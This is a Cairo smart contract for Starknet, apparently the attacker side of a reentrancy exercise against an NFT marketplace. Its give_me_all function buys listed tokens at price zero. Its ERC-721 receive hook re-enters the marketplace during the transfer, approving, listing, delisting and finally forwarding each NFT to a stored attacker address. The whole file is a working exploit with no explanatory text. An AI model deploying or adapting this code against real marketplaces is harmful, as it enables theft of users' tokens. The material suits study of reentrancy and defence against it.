#[starknet::interface]
pub trait IButchCassidy<TState> {
    fn give_me_all(ref self: TState, token_ids: Array<u256>);
}

pub const ISRC5_ID: felt252 = 
    0x3f918d17e5ee77373b56385708f855659a07f75997f365cf87748628532a055;

#[starknet::contract]
mod ButchCassidy {
    use openzeppelin_token::erc721::interface::{
        IERC721Dispatcher, IERC721DispatcherTrait,
        IERC721_RECEIVER_ID, IERC721Receiver,
    };
    use openzeppelin_introspection::src5::SRC5Component;
    use reentrancy_attacks::marketplace_attack::marketplace::{
        IMarketplaceDispatcher, IMarketplaceDispatcherTrait
    };
    use starknet::{ContractAddress, get_caller_address, get_contract_address};
    use starknet::storage::{StoragePointerReadAccess, StoragePointerWriteAccess};

    component!(path: SRC5Component, storage: src5, event: SRC5Event);

    #[abi(embed_v0)]
    impl SRC5Impl = SRC5Component::SRC5Impl<ContractState>;
    impl SRC5InternalImpl = SRC5Component::InternalImpl<ContractState>;

    #[storage]
    struct Storage {
        #[substorage(v0)]
        src5: SRC5Component::Storage,
        attacker: ContractAddress,
        marketplace: IMarketplaceDispatcher,
        nft: IERC721Dispatcher,
    }

    #[event]
    #[derive(Drop, starknet::Event)]
    enum Event {
        SRC5Event: SRC5Component::Event,
    }

    #[constructor]
    fn constructor(
        ref self: ContractState, 
        marketplace: ContractAddress,
        nft: ContractAddress,
        attacker: ContractAddress
    ) {
        self.marketplace.write(IMarketplaceDispatcher { contract_address: marketplace });
        self.nft.write(IERC721Dispatcher { contract_address: nft });
        self.attacker.write(attacker);
        self.src5.register_interface(IERC721_RECEIVER_ID);
    }

    #[abi(embed_v0)]
    impl IButchCassidyImpl of super::IButchCassidy<ContractState> {
        fn give_me_all(ref self: ContractState, token_ids: Array<u256>) {
            let mut token_ids_copy = token_ids.span();
            while token_ids_copy.len() > 0 {
                    let token_id = token_ids_copy.pop_front().unwrap();
                    self.marketplace.read().buy_nft(*token_id, 0);
                };
        }
    }

    #[abi(embed_v0)]
    impl IERC721ReceiverImpl of IERC721Receiver<ContractState> {
        fn on_erc721_received(
            self: @ContractState,
            operator: ContractAddress,
            from: ContractAddress,
            token_id: u256,
            data: Span<felt252>
        ) -> felt252 {

            self.nft.read().approve(
                self.marketplace.read().contract_address, 
                token_id
            );

            self.marketplace.read().list_nft(token_id, 0);
            self.marketplace.read().delist_nft(token_id);
            self.nft.read().transfer_from(get_contract_address(), self.attacker.read(), token_id);
            IERC721_RECEIVER_ID
        }

    
    }
}